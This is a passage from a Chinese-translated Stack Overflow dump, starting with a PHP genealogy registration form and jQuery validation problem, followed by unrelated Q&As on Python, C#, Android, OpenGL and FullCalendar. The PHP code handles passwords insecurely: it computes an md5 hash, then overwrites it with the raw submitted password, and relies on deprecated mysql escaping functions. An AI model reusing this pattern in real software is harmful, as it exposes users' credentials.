$grandmother_maidenname =mysql_real_escape_string(stripslashes( $_POST['grandmother_maidenname']));
$grandmother_birthdate = mysql_real_escape_string(stripslashes($_POST['grandmother_birthdate']));
$grandparents_mar_date = mysql_real_escape_string(stripslashes($_POST['grandparents_mar_date']));
//great-grandparents
$gr_grandfather_firstname = mysql_real_escape_string(stripslashes($_POST['gr_grandfather_firstname']));
$gr_grandfather_lastname = mysql_real_escape_string(stripslashes($_POST['gr_grandfather_lastname']));
$gr_grandfather_birthdate = mysql_real_escape_string(stripslashes($_POST['gr_grandfather_birthdate']));
$gr_grandmother_firstname = mysql_real_escape_string(stripslashes($_POST['gr_grandmother_firstname']));
$gr_grandmother_maidenname = mysql_real_escape_string(stripslashes($_POST['gr_grandmother_maidenname']));
$gr_grandmother_birthdate = mysql_real_escape_string(stripslashes($_POST['gr_grandmother_birthdate']));
$gr_grandparents_mar_date = mysql_real_escape_string(stripslashes($_POST['gr_grandparents_mar_date']));

//Spouse
$spouse_firstname = mysql_real_escape_string(stripslashes($_POST['spouse_firstname']));
$spouse_lastname = mysql_real_escape_string(stripslashes($_POST['spouse_lastname']));
$spouse_birthdate = mysql_real_escape_string(stripslashes($_POST['spouse_birthdate']));
$spouse_birthplace = mysql_real_escape_string(stripslashes($_POST['spouse_birthplace']));
$spouse_mar_date = mysql_real_escape_string(stripslashes($_POST['spouse_mar_date']));

//self
$first_name =  mysql_real_escape_string(stripslashes($_POST['first_name']));
$last_name = mysql_real_escape_string(stripslashes($_POST['last_name']));
$real_name = $_POST['first_name']." ".$_POST['last_name'];
$birthdate = mysql_real_escape_string(stripslashes($_POST['birthdate']));
$birthplace = mysql_real_escape_string(stripslashes($_POST['birthplace']));
$telephone = mysql_real_escape_string(stripslashes($_POST['telephone']));
$address = mysql_real_escape_string(stripslashes($_POST['address']));
$city = mysql_real_escape_string(stripslashes($_POST['city']));
$state_prov = mysql_real_escape_string(stripslashes($_POST['state_prov']));
$postalcode = mysql_real_escape_string(stripslashes($_POST['postalcode']));
$country = mysql_real_escape_string(stripslashes($_POST['country']));
$user_url = mysql_real_escape_string(stripslashes($_POST['user_url']));
$user_login = mysql_real_escape_string(stripslashes($_POST['user_login']));
$user_email = mysql_real_escape_string(stripslashes($_POST['user_email']));
$email = mysql_real_escape_string(stripslashes($_POST['email']));
$user_pass = mysql_real_escape_string(stripslashes($_POST['user_pass']));
$pass = md5($user_pass);
$pass = mysql_real_escape_string(stripslashes($_POST['pass']));
$notes = mysql_real_escape_string(stripslashes($_POST['notes']));

//error message variables
$oops = 'Uh Oh. You missed a few items! Please complete the following missing information:<br /><br />';
$nofather_firstname = 'Please enter Father\'s first name.';
$nofather_lastname = 'Please enter Father\'s last name.';
$nofather_birthdate = 'Please enter Father\'s date of birth.';
$nomother_firstname = 'Please enter Mother\'s first name.';
$nomother_maidenname = 'Please enter Mother\'s maiden name.';
$nomother_birthdate = 'Please enter Mother\'s date of birth.';
$noparents_mar_date = 'What? Your parents never got married?';

$nograndfather_firstname = 'Please enter Grandfather\'s first name.';
$nograndfather_lastname = 'Please enter Grandfather\'s first name.';
$nograndfather_birthdate = 'Please enter Grandfather\'s date of birth.';
$nograndmother_firstname = 'Please enter Grandmother\'s first name.';
$nograndmother_maidenname = 'Please enter Grandmother\'s maiden name.';
$nograndmother_birthdate = 'Please enter Grandmother\'s date of birth.';
$nograndparents_mar_date = 'No way your parent was illegitimate!!';

$nogr_grandfather_firstname = 'Please enter Great Grandfather\'s first name.';
$nogr_grandfather_lastname = 'Please enter Great Grandfather\'s first name.';
$nogr_grandfather_birthdate = 'Please enter Great Grandfather\'s date of birth.';
$nogr_grandmother_firstname = 'Please enter Great Grandmother\'s first name.';
$nogr_grandmother_maidenname = 'Please enter Great Grandmother\'s maiden name.';
$nogr_grandmother_birthdate = 'Please enter Great Grandmother\'s date of birth.';
$nogr_grandparents_mar_date = 'Okay, I\'ll give you a pass on this one. But if you don\'t know, just put "unknown."';

$nospouse_firstname = 'Please enter your Spouse\'s first name.';
$nospouse_lastname = 'Please enter your Spouse\'s last name.';
$nospouse_birthdate = 'Please enter your Spouse\'s birthdate.';
$nospouse_birthplace = 'Please enter your Spouse\'s birthplace.';
$nospouse_mar_date = 'Please enter the date you entered into wedded bliss.';

$sendto_email = "heather@uniquelyyourshosting.com";
$admin_mess = "Congratz TNG Admin !!! A new user joined your site !!!\n\n";

//Parent Info Table
$opt = '
<fieldset>
    <legend>Parent\'s Information</legend>
<table>
    <tr>
        <td>
            <label for "father_firstname">Father\'s First Name</label>
            <input type="text" id="father_firstname" class="validate[required]" name="father_firstname" />
        </td>
        <td>
            <label for "father_lastname">Father\'s Last Name</label>
            <input type="text" id="father_lastname" class="validate[required]" name="father_lastname" />
        </td>
        <td>
            <label for "father_birthdate">Father\'s Date of Birth</label>
            <input type="text" id="father_birthdate" class="validate[required]" name="father_birthdate" />
        </td>
    </tr>
    <tr>
        <td>
            <label for "mother_firstname">Mother\'s First Name</label>
            <input type="text" id="mother_firstname" class="validate[required]" name="mother_firstname" />
        </td>
        <td>
            <label for "mother_maidenname">Mother\'s Maiden Name</label>
            <input type="text" id="mother_maidenname" class="validate[required]" name="mother_maidenname" />
        </td>
        <td>
            <label for "mother_birthdate">Mother\'s Date of Birth</label>
            <input type="text" id="mother_birthdate" class="validate[required]" name="mother_birthdate" />
        </td>
    </tr>
    <tr>
        <td colspan="3">
            <label for="parents_mar_date">Marriage Date for this couple</label>
            <input type="text" id="parents_mar_date" class="validate[required]" name="parents_mar_date" />
        </td>
    </tr>
</table>
</fieldset>
';

//Add Grandparent Info
$opta = '
<fieldset>
    <legend>Grandparent\'s Information</legend>
<table>
    <tr>
        <td><label for "grandfather_firstname">Grandfather\'s First Name</label>
            <input type="text" id="grandfather_firstname" class="validate[required]" name="grandfather_firstname" />
        </td>
        <td>
            <label for "grandfather_lastname">Grandfather\'s Last Name</label>
            <input type="text" id="grandfather_lastname" class="validate[required]" name="grandfather_lastname" />
        </td>
        <td>
            <label for "grandfather_birthdate">Grandfather\'s Date of Birth</label>
            <input type="text" id="grandfather_birthdate" class="validate[required]" name="grandfather_birthdate" />
        </td>
    </tr>
    <tr>
        <td>
            <label for "grandmother_firstname">Grandmother\'s First Name</label>
            <input type="text" id="grandmother_firstname" class="validate[required]" name="grandmother_firstname" />
        </td>
        <td>
            <label for "grandmother_maidenname">Grandmother\'s Maiden Name</label>
            <input type="text" id="grandmother_maidenname" class="validate[required]" name="grandmother_maidenname" />
        </td>
        <td>
            <label for "grandmother_birthdate">Grandmother\'s Date of Birth</label>
            <input type="text" id="grandmother_birthdate" class="validate[required]" name="grandmother_birthdate" />
        </td>
    </tr>
    <tr>
        <td colspan="3">
            <label for="grandparents_mar_date">Marriage Date for this couple</label>
            <input type="text" id="grandparenst_mar_date" class="validate[required]" name="grandparents_mar_date" />
        </td>
    </tr>
</table>
</fieldset>
';

//Add Great-Grandparent's Information
$optb = '
<fieldset>
    <legend>Great-Grandparent\'s Information</legend>
<table>
    <tr>
        <td><label for "gr_grandfather_firstname">Great-Grandfather\'s First Name</label>
            <input type="text" id="gr_grandfather_firstname" class="validate[required]" name="gr_grandfather_firstname" />
        </td>
        <td>
            <label for "gr_grandfather_lastname">Great-Grandfather\'s Last Name</label>
            <input type="text" id="gr_grandfather_lastname" class="validate[required]" name="gr_grandfather_lastname" />
        </td>
        <td>
            <label for "gr_grandfather_birthdate">Great-Grandfather\'s Date of Birth</label>
            <input type="text" id="gr_grandfather_birthdate" class="validate[required]" name="gr_grandfather_birthdate" />
        </td>
    </tr>
    <tr>
        <td>
            <label for "gr_grandmother_firstname">Great-Grandmother\'s First Name</label>
            <input type="text" id="gr_grandmother_firstname" class="validate[required]" name="gr_grandmother_firstname" />
        </td>
        <td>
            <label for "gr_grandmother_maidenname">Great-Grandmother\'s Maiden Name</label>
            <input type="text" id="gr_grandmother_maidenname" class="validate[required]" name="gr_grandmother_maidenname" />
        </td>
        <td>
            <label for "gr_grandmother_birthdate">Great-Grandmother\'s Date of Birth</label>
            <input type="text" id="gr_grandmother_birthdate" class="validate[required]" name="gr_grandmother_birthdate" />
        </td>
    </tr>
    <tr>
        <td colspan="3">
            <label for="gr_grandparents_mar_date">Marriage Date for this couple</label>
            <input type="text" id="gr_grandparenst_mar_date" class="validate[required]" name="gr_grandparenst_mar_date" />
        </td>
    </tr>
</table>
</fieldset>
';
?>
<script type="text/javascript">
$(document).ready(function(){
    $("#register").validationEngine();
    alert( $("#register").validationEngine('validate') );
   });
</script>
<form action="" enctype="multipart/form-data" method="post" id="register" name="register">
<fieldset>
    <legend>How are you related to this person?</legend>
<table>
    <tr>
        <td>
            <span style="display: inline-block;"><?php echo $read.$readonly; ?></span>
            &nbsp;
            <span style="display: inline-block;">
            <label style="display: inline-block;" for="whom">is</label>
            <input id="whom" type ="radio" name="whom" selected="selected" class="validate[required]" value="My" onclick="document.getElementById ('spouse').style.display = 'none';">My &nbsp;
            <input id="whom" type ="radio" class="validate[required]" name="whom" onclick="document.getElementById ('spouse').style.display = 'block';" value="Spouse"/>My Spouse's
            </span>
            &nbsp;
            <span style="display: inline-block;">
            <select id="relation" name="relation" onchange="processAncestor();" class="validate[required]">
                <option value="Father">Father</option>
                <option value="Mother">Mother</option>
                <option value="Sister of Father">Sister of Father</option>
                <option value="Sister of Mother">Sister of Mother</option>
                <option value="Brother of Father">Brother of Father</option>
                <option value="Brother of Mother">Brother of Mother</option>
                <option value="Brother">Brother</option>
                <option value="Sister">Sister</option>
                <option value="Grandfather">Grandfather</option>
                <option value="Grandmother">Grandmother</option>
                <option value="Great Grandfather">Great Grandfather</option>
                <option value="Great Grandmother">Great Grandmother</option>
                <option value="2nd Great Grandfather">2nd Great Grandfather</option>
                <option value="2nd Great Grandmother" >2nd Great Grandmother</option>
                <option value="Self">Self</option>
                <option value="" selected="selected">Select a Relationship</option>
            </select>
            </span>
        </td>
    </tr>
    <tr>
        <td>
            <p style="font-weight: bold;">If none of the available relationships properly describes your relationship to this person, you will need to email us directly to explain.</p>
        </td>
    </tr>
</table>
<br /><br />
<div id="opt">
<p>Please complete the following information about your/your spouses' parents:</p>
<p>If you selected Myself above, we are looking for your parents information. If you selected My Spouse above, then we are looking for your spouse's parents. All Fields are Required. Dates should be in Day Month Year format as follows: 01 Jan 1900.</p>
<?php echo $opt; ?>
</div>

<div id="opta">
<p>Please complete the following information about your/your spouses' grandparents:</p>
<?php echo $opta; ?>
</div>

<div id="optb">
<p>Please complete the following information about your/your spouses' great-grandparents:</p>
<?php echo $optb; ?>
</div>

<div id="spouse">
<br /><br />
<p>Please complete the following information about your spouse:</p>
<table>
    <tr>
        <td>
            <label for "spouse_firstname">Spouse Name</label>
            <input type="text" id="spouse_firstname" class="validate[required] text-input" name="spouse_firstname" />
        </td>
        <td>
            <label for "spouse_lastname">Spouse Surname</label>
            <input type="text" id="spouse_lastname" class="validate[required]" name="spouse_lastname" />
        </td>
        <td>
            <label for "spouse_birthdate">Spouse Date of Birth</label>
            <input type="text" id="spouse_birthdate" class="validate[required]" name="spouse_birthdate" />
        </td>
    </tr>
    <tr>
        <td>
            <label for "spouse_birthplace">Spouse Location Of Birth</label>
            <input type="text" id="spouse_birthplace" class="validate[required]" name="spouse_birthplace" />
        </td>
        <td>
            <label for "md">Your Marriage Date</label>
            <input type="text" id="spouse_mar_date" class="validate[required]" name="spouse_mar_date" />
        </td>
    </tr>
</table>
</div>
</fieldset>
<fieldset>
    <legend>Your Information</legend>
<div id="self">
<p>Please complete the following information about yourself for the User Registration:
<br />An <strong>*</strong> indicates a <strong>Required</strong> field.</p>

<table style="width: 100%;">
    <tr>
        <td width="20%">
            <label for="first_name">First Name*</label>
        </td>
        <td width="20%">
            <input type="text" id="first_name" class="validate[required] text-input" name="first_name" />
        </td>
        <td width="60%"><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="last_name">Last Name*</label>
        </td>
        <td>
            <input type="Text" id="last_name" class="validate[required] text-input" name="last_name" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="birthdate">Date of birth*</label>
        </td>
        <td>
            <input type="Text" id="birthdate" class="validate[required] text-input" name="birthdate" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="birthplace">Location of birth</label>
        </td>
        <td>
            <input type="Text" id="birthplace" name="birthplace" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="telephone">Phone Number*</label>
        </td>
        <td>
            <input type="text" id="telephone" class="validate[required]" name="telephone" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="address">Address*</label>
        </td>
        <td>
            <input type="Text" class="validate[required]" name="address" id="address" />
        </td>
    </tr>
    <tr>
        <td>
            <label for="city">City*</label>
        </td>
        <td>
            <input type="Text" id="city" class="validate[required]" name="city" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="state_prov">State/Province*</label>
        </td>
        <td>
            <input type="Text" id="state_prov" class="validate[required]" name="state_prov" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="postalcode">Postal Code*</label>
        </td>
        <td>
            <input type="Text" id="postalcode" class="validate[required]" name="postalcode" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="country">Country*</label>
        </td>
        <td>
            <input type="Text" id="country" class="validate[required]" name="country" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="user_url">Your Website</label>
        </td>
        <td>
            <input type="Text" name="user_url" id="user_url" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="user">Login Name*</label>
        </td>
        <td>
            <input type="Text" class="validate[required]" name="user_login" id="user_login" />
        </td>
        <td>
            Usernames cannot begin with a number and should not contain any punctuation characters (no . , : ; ' " ! \ / [ ] { } + - )
        </td>
    </tr>
    <tr>
        <td>
            <label for="user_email">Email Address*</label>
        </td>
        <td>
            <input type="text" class="validate[required]" name="user_email" id="user_email" />
        </td>
        <td>
            Please make sure you are not blocking mail from the this domain to ensure email from us does not end up in a spam or junk folder.
        </td>
    </tr>
    <tr>
        <td>
            <label for="email">Email Again*</label>
        </td>
        <td>
            <input type="Text" class="validate[required]" name="email" id="email" />
        </td>
        <td><br /><br /></td>
    </tr>
    <tr>
        <td>
            <label for="user_pass">Password*</label>
        </td>
        <td>
            <input type="password" class="validate[required]" name="user_pass" id="user_pass" />
        </td>
        <td>
            Passwords should be at least 7 characters and include at least one Upper case letter, one lower case letter and one number/symbol.
        </td>
    </tr>
    <tr>
        <td>
            <label for="pass">Password Again*</label>
        </td>
        <td>
            <input type="password" class="validate[required]" name="pass" id="pass" />
        </td>
        <td><br /><br /></td>
    </tr>
</table>
<br /><br />
<label for="notes">Notes:</p>
<textarea cols="75" rows="5" name="notes" id="notes"></textarea>
</div>
</fieldset>
<br />
<input type="submit" value="Submit User Registration" name="submit" />
</form> 
```

关系选择字段的自定义 javascript 在这里：

```
 function processAncestor() {
    if (document.getElementById("relation").selectedIndex == 0) {//father
        document.getElementById('opt').style.display = 'none';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 1) {//mother
        document.getElementById('opt').style.display = 'none';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 2) {//sister of father
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 3) {//sister of mother
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 4) {//brother of father
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 5) {//brother of mother
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 6) {//brother
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 7) {//sister
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 8) {//grandfather
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 9) {//grandmother
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 10) {//great-grandfather
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'block';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 11) {//great-grandmother
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'block';
        document.getElementById('optb').style.display = 'none';
    }
    if (document.getElementById("relation").selectedIndex == 12) {//2gr-grandfather
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'block';
        document.getElementById('optb').style.display = 'block';
    }
    if (document.getElementById("relation").selectedIndex == 13) {//2gr-grandmother
        document.getElementById('opt').style.display = 'block';
        document.getElementById('opta').style.display = 'block';
        document.getElementById('optb').style.display = 'block';
    }
    if (document.getElementById("relation").selectedIndex == 14) {//self
        document.getElementById('opt').style.display = 'none';
        document.getElementById('opta').style.display = 'none';
        document.getElementById('optb').style.display = 'none';
    }
}; 
```

我非常感谢帮助我弄清楚为什么我无法让验证脚本在 Sufffusion 页面中使用此表单正常运行。我怀疑某处存在 JQuery/Javascript 冲突，但我是个菜鸟，我往往会破坏很多东西！我也欢迎任何机会从我的破损中学习！谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:21:23.683

看起来您包含的 jquery 文件调用[没有冲突](http://api.jquery.com/jQuery.noConflict/)

尝试将您`$`的 jquery 调用替换为验证引擎`jQuery`

您在控制台“Uncaught TypeError: Property of object [object Window] is not a function”中遇到错误，`$`这与此一致。

将jquery更改为此

```
jQuery(document).ready(function(){
  jQuery("#register").validationEngine();
  alert( jQuery("#register").validationEngine('validate') );
}); 
```

并删除这个

```
$.noConflict(); 
```

# python - 在 Python 中生成所有可能的映射列表

> ID：12009177
> 
> 赞同：3
> 
> 时间：2012-08-17T15:59:39.407
> 
> 标签：python, map, set

假设我们有一个映射 K -> V，其中域 K 是一个集合（[1,2,3]），而共同域 V 是从集合（['a', 'b' ，'C']）。是否有一种简洁的方法可以将所有可能的映射枚举为可迭代（理想情况下是字典列表或生成器）：

例如。

```
[ { 1 : 'a', 2 : 'a', 3 : 'a' },
  { 1 : 'a', 2 : 'a', 3 : 'b' },
  { 1 : 'a', 2 : 'b', 3 : 'a' },
  ...
  { 1 : 'c', 2 : 'c', 3 : 'c' }
] 
```

请注意，域的大小不是固定的，因此这种解决方案并不理想：

```
[ { 1 : x, 2 : y,  3 : z } for x in V for y in V for z in V ] 
```

干杯

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T16:05:12.623

使用`repeat`参数[`itertools.product`](http://docs.python.org/dev/library/itertools.html#itertools.product)：

```
K = set([1, 2, 3])
V = set(['a', 'b', 'c'])
itertools.product(V, repeat=len(K)) 
```

然后，您可以`dict`在理解中构造 s：

```
(dict(zip(K, x)) for x in itertools.product(V, repeat=len(K))) 
```

检查：

```
>>> len([dict(zip([1, 2, 3], x)) for x in itertools.product('abc', repeat=3)])
27 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T16:04:36.920

使用[`itertools.product`](http://docs.python.org/library/itertools.html#itertools.product)：

```
import itertools
K,V = [1,2,3], 'abc'
[dict(zip(K, p)) for p in itertools.product(V, repeat=len(V))] 
```

# c# - 正则表达式查找和替换不在另一个单词之后的任何单词

> ID：12009179
> 
> 赞同：1
> 
> 时间：2012-08-17T15:59:54.100
> 
> 标签：c#, regex, string

我目前正在像这样的字符串上运行一个简单的查找和替换：

```
1\. User.Name "John"
2\. User.Age 20
3\. Name.Length 5 
```

但是，尝试替换`Name`为`WHATEVER`以下结果：

```
1\. User.WHATEVER "John"
2\. User.Age 20
3\. WHATEVER.Length 5 
```

我需要更改第 3 行，而不是第 1 行。如何检查当前单词是否在点 ( `.`) 之后并跳过替换该单词？

我在 .NET 4.0 中，我的正则表达式目前看起来像这样：

```
result = new Regex(@"\b" + oldWord + @"\b").Replace(text, newWord); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:01:47.780

您可以[对](http://www.regular-expressions.info/lookaround.html):`.``(?<!\.)`

这给出了：

```
result = new Regex(@"\b(?<!\.)" + oldWord + @"\b").Replace(text, newWord); 
```

# android - 平滑滚动在 ViewPager 中不起作用（支持库）

> ID：12009180
> 
> 赞同：10
> 
> 时间：2012-08-17T15:59:55.817
> 
> 标签：android, scroll, android-viewpager

我正在编写`ViewPager`用于托管`Fragment`s 的应用程序。

当我以编程方式更改片段时，平滑滚动功能不起作用。我使用 ViewPager.setCurrentItem(int item, boolean smoothScroll)` 方法。

也许有人知道这个错误的解决方法？也许有动画？

编辑：我正在使用支持包。问题是无论我使用`ViewPager.setCurrentItem(2, true)`还是`ViewPager.setCurrentItem(2, false)`结果都是一样的。视图切换非常快（不流畅）。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-21T14:09:42.570

我通过创建一个使用反射覆盖 ViewPager.mScroller 的 MyViewPager 解决了这个问题。

```
public class MyViewPager extends ViewPager 
{
  public MyViewPager( Context context, AttributeSet attrs) 
  {
    super( context, attrs );
    setMyScroller();
  }
  private void setMyScroller() 
  {
    try 
    {
            Class<?> viewpager = ViewPager.class;
            Field scroller = viewpager.getDeclaredField("mScroller");
            scroller.setAccessible(true);
            scroller.set(this, new MyScroller(getContext()));
    } catch (Exception e) 
    {
        e.printStackTrace();
    }
  }

  public class MyScroller extends Scroller 
  {
    public MyScroller(Context context) 
    {
        super(context, new DecelerateInterpolator());
    }

    @Override
    public void startScroll(int startX, int startY, int dx, int dy, int duration) 
    {
        super.startScroll(startX, startY, dx, dy, 1000 /*1 secs*/);
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-30T16:58:39.890

对我有用的是在 mPagerAdapter.notifyDataSetChanged() 之后调用 mPager.setCurrentItem，而不是作为发布的可运行文件。

这是一个示例（在 MonoDroid 中）：

```
 public void UpdateDetialsView(string type)
    {
        string typeName4 = Java.Lang.Class.FromType(typeof(ParcelRecordComplaintDetailsView)).Name;

        if (_fragments.Count > 3)
        {
            _fragments.RemoveAt(_fragments.Count - 1);

            ////////////////////////////////////////////////////////////
            // Called here it wasn't working for me (Posted or not)

            //_viewPager.Post(new Action(() => { _viewPager.SetCurrentItem(3, true); }));
        }

        _fragments.Add(Fragment.Instantiate(Activity, typeName4));

        _pagerAdapter.NotifyDataSetChanged();

        ////////////////////////////////////////////////////////////
        // Called here it works as expected

        _viewPager.SetCurrentItem(3, true);
    } 
```

在哪里

```
 protected MyAdapter _pagerAdapter;
    protected ViewPager _viewPager;
    private List<Android.App.Fragment> _fragments; 
```

和

```
 public class MyAdapter : Android.Support.V13.App.FragmentStatePagerAdapter
    {
        private List<Fragment> _fragments;

        public override Java.Lang.Object InstantiateItem(View p0, int p1)
        {
            return base.InstantiateItem(p0, p1);
        }

        public MyAdapter(Android.App.FragmentManager fm) : base(fm)
        {

        }

        public MyAdapter(Android.App.FragmentManager fm, List<Android.App.Fragment> fragments) : base(fm)
        {
            _fragments = fragments;
        }

        public override int Count
        {
            //get { return FRAG_PAGES; }
            get { return _fragments.Count; }
        }

        public override Android.App.Fragment GetItem(int p0)
        {
            return _fragments[p0];
        }

        public override float GetPageWidth(int p0)
        {
            //return base.GetPageWidth(p0);

            return (float) (0.5f);
        }

        public override int GetItemPosition(Java.Lang.Object p0)
        {
            //return base.GetItemPosition(p0);
            return PagerAdapter.PositionNone;
        }
    } 
```

# wpf - SharpGL 是否支持四缓冲立体声？

> ID：12009183
> 
> 赞同：0
> 
> 时间：2012-08-17T16:00:06.277
> 
> 标签：wpf, opengl, stereo-3d

我正在寻找一个平台来向戴着快门眼镜的用户显示一对立体位图图像。我正在探索通过 SharpGL 在 OpenGL 中实现这一点的可能性。我的目标是 WPF，但 Winforms 不会破坏交易。所以... SharpGL 可以做到这一点吗？

如果没有，在平台上有什么建议吗？我不需要 3D 本身，只是一种用一副快门眼镜同步左/右立体图像的方法。我一直在通过 DirectX 处理 NVidia 3D Vision，但该方法似乎笨拙且专有，更不用说我们仅限于全屏。我喜欢我在 OpenGL 中看到的东西，但缺点是要进行立体声，我们将仅限于启用四缓冲区的视频卡。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-11T09:06:37.520

查找查看转换：

[http://www.orthostereo.com/geometryopengl.html](http://www.orthostereo.com/geometryopengl.html)

重绘时使用两个opengl视口并将数据直接导入两个视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-21T15:27:19.337

在研究了几个星期之后，我得出的结论是 SharpGL 不支持四重缓冲。即使枚举了缓冲区名称，它们似乎实际上并没有做任何事情。

OpenTK 似乎可以工作，但在撰写本文时还没有原生 WPF 控件。

# date - Firefox 中的 FullCalendar IETF 日期

> ID：12009189
> 
> 赞同：0
> 
> 时间：2012-08-17T16:00:38.860
> 
> 标签：date, firefox, fullcalendar

我一直在使用 FullCalendar 并在 Firefox 中遇到了一些问题。我可以选择，开始日期以 IETF 格式出现。出于某种原因，IE8 能够发布此内容（并将其自动转换为时间戳），但 Firefox 不会。

它以 IETF 格式保留它，并且 PHP 的`date()`功能不适用于它。我将该`fullCalendar.formatDate()`功能用作解决方法，但这对我来说似乎不是最好的解决方案。

还有另一种方法可以使这项工作吗？

```
<script type='text/javascript'>
    $(document).ready(function () {
        var date = new Date();
        var calendar = $("#calendar").fullCalendar({
            theme: true,
            title: "Employee Calendar",

            header: {
                left: 'prev,next today',
                center: 'title',
                right: 'month,agendaWeek,agendaDay'
            },
            buttonIcons: {prev: 'circle-triangle-w', next: 'circle-triangle-e'},
            editable: true,
            droppable: true,
            events: '<?php echo matry::base_to('utilities/calendar_events');?>',
            eventClick: function (event) {
                $.ajax({
                    url: '<?php echo matry::base_to('utilities/calendar_tools');?>',
                    type: 'POST',
                    data: {id: event.id, job: 'getEvent'},
                    success: function(data){
                        $("#event_box").fadeIn(500);
                        $("#event_info").html(data);        
                    }
                });
            },
            selectable: true,
            selectHelper: true,
            select: function (start, end, allDay){                                    
                var title = prompt('Event Title');
                start = $.fullCalendar.formatDate(start, 'yyyy-MM-dd HH:mm:ss');
                end = $.fullCalendar.formatDate(end, 'yyyy-MM-dd HH:mm:ss');
                if (title)
                {
                    $.ajax({
                        type: 'POST',
                        url: '<?php echo matry::base_to('utilities/calendar_tools');?>',
                        data: {title: title, start: start, end: end, allDay: allDay, job: 'createEvent'},
                        success: function(data) {
                            calendar.fullCalendar('refetchEvents' );
                            $("#alerts").html(data);
                        }//close success function
                    })//close ajax
                }
                else 
                    calendar.fullCalendar('unselect');
            }//close select function
        }); //close fullcalendar function

        $("#calendar_controls").accordion({
            collapsible: true,
            clearStyle:true,
            active: false,
            autoHeight: true
        });//close calendar controls

        $(document).on('submit', '#event_form', function (event){
            event.preventDefault();
                $.ajax({
                    url: '<?php echo matry::base_to('utilities/calendar_tools');?>',
                    type: 'POST',
                    data: $('#event_form').serialize(),
                    success: function(data){
                        $("#event_box").fadeOut('2000');
                        $("#alerts").html(data).focus();
                    }
                })    
        });//close on function

        $(document).on('click', '#delete', function() {
            var con = confirm('Do you want to delete this Event?');
            if (con)
            {
                var id = $("#event_form input[name= 'id']").val();
                $.ajax({
                    url: '<?php echo matry::base_to('utilities/calendar_tools');?>',
                    data: {id: id, job: 'deleteEvent'},
                    type: 'POST',
                    success: function(data){
                        $("#alerts").html(data).focus()
                        calendar.fullCalendar('refetchEvents');
                        $("#event_box").fadeOut(1000);
                    ;}
                });
            }
        })
    }); //close document.ready function
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T17:47:01.020

Firefox 无法正确传递 IETF 日期格式，但可以使用看起来运行良好的 $.fullCalendar.formatDate() 函数更改日期。如果在日期过去的任何地方都添加了此项，则可以更改格式。

# c# - 将正交结构字段包装在与值无关的读写属性中是否有用

> ID：12009191
> 
> 赞同：1
> 
> 时间：2012-08-17T16:00:48.623
> 
> 标签：c#, .net, vb.net, struct

在属性中包装结构或类字段会强制对该字段的所有访问都通过“getter”和“setter”方法。这允许为验证、延迟初始化等添加逻辑。此外，在类字段的情况下，它允许一个可能具有适用于某些实例但不适用于其他实例的逻辑的可能性；如果属性不是虚拟的，则可能难以有效地实现这种逻辑（例如，可能必须定义一个 static`VerySpecialInstance`并让属性 getter 说`if (this == VerySpecialInstance) GetSpecialProperty(); else GetOrdinaryProperty();`）但它可以完成。

但是，如果结构（例如`System.Drawing.Point`）的语义规定可以使用对其类型合法的任何值写入特定的读写属性，则写入除了更改其值之外没有任何副作用，它将始终返回最后写入的值（如果有），如果未写入，它将作为其类型的默认值读取；如果使用该类型的代码可能依赖于这样的假设，那么我不清楚使用读写属性而不是保存该值的字段可能会带来什么好处。

